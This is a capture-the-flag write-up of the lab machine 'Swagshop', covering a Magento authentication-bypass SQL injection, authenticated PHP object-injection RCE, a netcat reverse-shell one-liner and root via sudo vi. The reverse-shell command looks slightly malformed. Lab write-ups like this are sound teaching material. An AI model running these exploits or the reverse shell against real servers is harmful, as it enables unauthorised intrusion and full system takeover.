# Swagshop - Linux (Easy)

## Summary
Swagshop was an easy box that involved a Magneto store web server. I start off by exploiting an authentication bypass to add an admin user to the CMS. I then used an authenticated exploitation of a PHP Object Injection Vulnerability to get RCE. I was able to then use Vi to privesc to gain root level access.

## Enumeration
I started Enumeration by running Rustscan on the the target that showed ports 22 & 80 being open.

```
rustscan -a $machine_IP -- -A -sV -sC -T4 -vv

-sC - Script Scan
-sV - Version Scan
-T4 - Timing Template
-A  - Aggresive Scan Options
-vv - Verbosity level

### Port 80 - HTTP
The website is a Magneto Gift Shop Store. I ran Gobuster on `index.php` which provided more details than the landing page, including an admin directory.

![Magento Login](Images/magento_login.png)

The `admin` directory had an Admin login page for which, default credentials didn't seem to do the trick. With some Searchsploit and Googling, I was able to settle on the [Shoplift](https://github.com/joren485/Magento-Shoplift-SQLI) exploit. The PoC selects an admin user, feeds queries into one line and inserts a username:password combination which allows legitimate access.

![adminlogin](Images/admin-login.png)

## User Foothold

Now that I am authenticated, I was able to use Searchsploit to grab working code for an Authenticated RCE [exploit](https://www.exploit-db.com/exploits/37811).

![script-date](Images/script-date.png)

Having done some research on the nature of this exploit, it appears to be a PHP Object Injection Vulnerability. A key aspect to this attack vector is the date when it was installed which is present in `swagshop.htb/app/etc/local.xml`. This allows me to inject my own code, resulting in the RCE. 

After [RCE.py](RCE.py) was debugged, I was able to run the following Proof of Concept.

```
python exploit.py http://IP/index.php/admin "whoami" 

http://swagshop.htb/index.php/admin/index/index/key/15b8de05ecf8a02c061eec0d14578a48/?SID=901gjdi369elk0fkpp5rguve55
http://swagshop.htb/index.php/admin/dashboard/index/key/fa2c88ef0cf6cd68256766221e0a9866/

www-data
```

Seeing that this provided the expected output of the `whoami` command giving me access as `www-data`, I was able to expand on this to set a netcat reverse shell and a listener

```
python exploit.py http://$machine_IP/index.php/admin "rm /tmp/f;f;cat /tmp/f|/bin/sh -i 2>&1|nc $machine_IP 1234 >/tmp/f"
```

Having established this, I was able to upgrade my shell and grab the user flag. 

![user.txt](Images/user.txt.png)

## Privilege Escalation

After obtaining the user flag, I ran `sudo -l` to identify what other applications the user could run as root. This was surprisingly easy as I could use `/usr/bin/vi` & `/var/www/html/*`

![sudo-l](Images/sudo-l.png)

![privesc](Images/privesc-exploit.png)

For reference, I used the associated [GTFO Bins](https://gtfobins.github.io/gtfobins/vi/) resource.

This ensured that I was able to reach the `root.txt` file and grab the root file as an unprivileged user. When in Vi, I was able to use the `:sh` flag which gave me a root shell
